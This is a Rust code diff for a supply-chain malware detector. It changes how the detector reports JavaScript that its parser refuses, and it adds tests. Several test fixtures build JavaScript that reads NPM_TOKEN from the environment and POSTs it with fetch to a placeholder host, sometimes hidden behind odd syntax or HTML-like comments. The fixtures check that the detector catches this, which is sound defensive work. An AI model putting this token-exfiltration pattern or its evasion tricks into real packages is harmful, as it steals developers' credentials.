@@ -3530,18 +3530,32 @@ pub struct Facts {
     pub rewrote: Vec<(usize, PyStr)>,
 }
 
+/// Why the tree said nothing about a text.
+#[derive(Clone, Debug, PartialEq)]
+pub enum Unread {
+    /// the parser refused it (JavaScript's reading, the first tried: its line and reason), and TypeScript's too
+    Refused(usize, PyStr),
+    /// over MAX_FILE, or past the pass's budget
+    Other,
+}
+
 thread_local! {
-    /// The last text read and what the tree said (None: it could not say):
-    /// the tests ask for a text's send, then for its received code.
-    static LAST: std::cell::RefCell<Option<(Vec<u32>, Option<Rc<Facts>>)>> = const { std::cell::RefCell::new(None) };
+    /// The last text read and what the tree said (Err: why it could not
+    /// say): the tests ask for a text's send, then for its received code.
+    static LAST: std::cell::RefCell<Option<(Vec<u32>, Result<Rc<Facts>, Unread>)>> = const { std::cell::RefCell::new(None) };
 }
 
 /// The tree's facts about a JavaScript text, or None when it could not say
 /// (a text the parser doesn't read, over 2 MB, or past the pass's budget):
 /// the text followers answer then.
 pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
+    facts_or_why(text).ok()
+}
+
+/// facts(), or why there are none.
+fn facts_or_why(text: &[u32]) -> Result<Rc<Facts>, Unread> {
     if text.len() > MAX_FILE {
-        return None;
+        return Err(Unread::Other);
     }
     if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
         return hit;
@@ -3550,6 +3564,42 @@ pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
     let got = crate::api::on_own_stack(move || facts_here(&owned)).map(Rc::new);
     LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
     got
+}
+
+/// The parser's refusal of a JavaScript text whose tree the supply-chain tests read (its line and reason): the
+/// tests that read the tree then had only the text followers (JS-PARSE-STRICT: a package file the parser refuses
+/// is said in the report). None when the tree was read, or not for that reason. Asked before the tests, it reads the
+/// text once for them (facts' cache).
+pub fn refusal(text: &[u32]) -> Option<(usize, PyStr)> {
+    match facts_or_why(text) {
+        Err(Unread::Refused(line, reason)) => Some((line, reason)),
+        _ => None,
+    }
+}
+
+/// refusal() by the parse alone, without the model's reading: what a host asks of a text another test read on its
+/// tree (an install script's: the registry's `js_refusal`).
+pub fn parse_refusal(text: &[u32]) -> Option<(usize, PyStr)> {
+    if text.len() > MAX_FILE {
+        return None;
+    }
+    let owned = text.to_vec();
+    crate::api::on_own_stack(move || supply_tree(&owned).err())
+}
+
+/// The tree the model reads for a JavaScript text, or the parser's refusal of it (the JavaScript reading's line and
+/// reason, when TypeScript's refuses it too).
+fn supply_tree(text: &[u32]) -> Result<crate::jsparse::tree::Tree, (usize, PyStr)> {
+    match crate::jsparse::parse_file(&u("script.js"), text) {
+        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a TypeScript file's
+        // text is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is read
+        // as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
+        // so, and the comment's reading stands.)
+        Ok(t) if t.html_after_code => Ok(crate::jsparse::parse_with(text, false, true, false).unwrap_or(t)),
+        Ok(t) => Ok(t),
+        // (TypeScript, which the hosts hand as JavaScript)
+        Err(e) => crate::jsparse::parse_file(&u("script.ts"), text).map_err(|_| (e.line as usize, e.reason)),
+    }
 }
 
 /// The strongest send of local data in a JavaScript text, read on its tree.
@@ -3586,22 +3636,10 @@ pub fn rewrote(text: &[u32]) -> Option<Vec<(usize, PyStr)>> {
     facts(text).map(|f| f.rewrote.clone())
 }
 
-fn facts_here(text: &[u32]) -> Option<Facts> {
+fn facts_here(text: &[u32]) -> Result<Facts, Unread> {
     let pack = crate::pack::current();
     let path = u("script.js");
-    let tree = match crate::jsparse::parse_file(&path, text) {
-        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a TypeScript file's
-        // text is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is read
-        // as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
-        // so, and the comment's reading stands.)
-        Ok(t) if t.html_after_code => crate::jsparse::parse_with(text, false, true, false).unwrap_or(t),
-        Ok(t) => t,
-        // (TypeScript, which the hosts hand as JavaScript)
-        Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
-            Ok(t) => t,
-            Err(_) => return None,
-        },
-    };
+    let tree = supply_tree(text).map_err(|(line, reason)| Unread::Refused(line, reason))?;
     let sup = Rc::new(Supply::new(pack, text));
     let mut cfg = Config::new(&[], &[], &[], &[]);
     cfg.supply = Some(sup.clone());
@@ -3613,7 +3651,7 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
     let mut findings: Vec<Out> = Vec::new();
     let notes = fixpoint(&mut prog, &mut findings);
     if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
-        return None;
+        return Err(Unread::Other);
     }
     let late = late_drops(&sup, &findings);
     findings.extend(late);
@@ -3658,7 +3696,7 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
         let at = (at as usize).min(text.len());
         (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
     });
-    Some(Facts { sent, received, decoded, dropped, rewrote })
+    Ok(Facts { sent, received, decoded, dropped, rewrote })
 }
 
 #[cfg(test)]
@@ -3669,7 +3707,7 @@ mod tests {
 
     fn sent(src: &str) -> Option<(&'static str, String, bool)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text).map(|f| f.sent) {
+        match facts_here(&text).ok().map(|f| f.sent) {
             Some(Answer::Found(_at, kind, what, in_address)) => {
                 Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
             }
@@ -3685,7 +3723,7 @@ mod tests {
     /// The category of a text's first received code, if any.
     fn runs(src: &str) -> Option<&'static str> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.received.map(|(_, cat)| cat),
             None => panic!("not read: {}", src),
         }
@@ -3702,6 +3740,35 @@ mod tests {
         assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN; let y = 1;\nz = 5\n<!--y, {}", post)), found("environment", "NPM_TOKEN"));
         // and where that reading is no program, no runtime runs it so: the comment's reading stands
         assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n<!-- a note\n{}", post)), found("environment", "NPM_TOKEN"));
+    }
+
+    #[test]
+    fn what_v8_compiles_and_the_parser_refused_is_read() {
+        // (JS-PARSE-STRICT) an assignment to a call, which V8 compiles and leaves to a ReferenceError when it runs, and
+        // `let` as a name in a for-in head, made the whole file a syntax error to the parser: the tree said nothing
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        for odd in ["if (0) { f() = 1; }", "if (0) { f()++; }", "if (0) { for (f() in x); }", "for (let in {});"] {
+            assert_eq!(sent(&format!("{}\nconst v = process.env.NPM_TOKEN;\n{}", odd, post)), found("environment", "NPM_TOKEN"), "{}", odd);
+        }
+        // the call made before the ReferenceError is read: here the send itself
+        let call = format!("fetch('https://{}/c', {{ method: 'POST', body: v }}) = 0;\n", HOST);
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", call)), found("environment", "NPM_TOKEN"));
+        let call = format!("for (fetch('https://{}/c', {{ method: 'POST', body: v }}) in {{ a: 1 }});\n", HOST);
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", call)), found("environment", "NPM_TOKEN"));
+    }
+
+    #[test]
+    fn the_parse_alone_says_what_the_model_says_of_a_refusal() {
+        // (JS-PARSE-STRICT) the registry's js_refusal asks the parse alone, of a text another test read on its tree
+        let deep = format!("x = {}{};\n", "[".repeat(200), "]".repeat(200));
+        let srcs = ["const = 1;\n", "x = 'unterminated\n", "module.exports = 1;\n", "if (0) { f() = 1; }\n",
+                    "let x: number = 1;\n", "<!-- a banner\nx = 1;\n", deep.as_str()];
+        for src in srcs {
+            let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+            assert_eq!(parse_refusal(&text), refusal(&text), "{}", src);
+        }
+        let text: Vec<u32> = "a = 1;\nconst = 1;\n".chars().map(|c| c as u32).collect();
+        assert_eq!(parse_refusal(&text), Some((2, u("unexpected token '='"))));
     }
 
     #[test]
@@ -4209,7 +4276,7 @@ mod tests {
     fn decoded(src: &str) -> Vec<(usize, usize)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
         let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
             None => panic!("not read: {}", src),
         }
@@ -4249,7 +4316,7 @@ mod tests {
 
     fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
             None => panic!("not read: {}", src),
         }
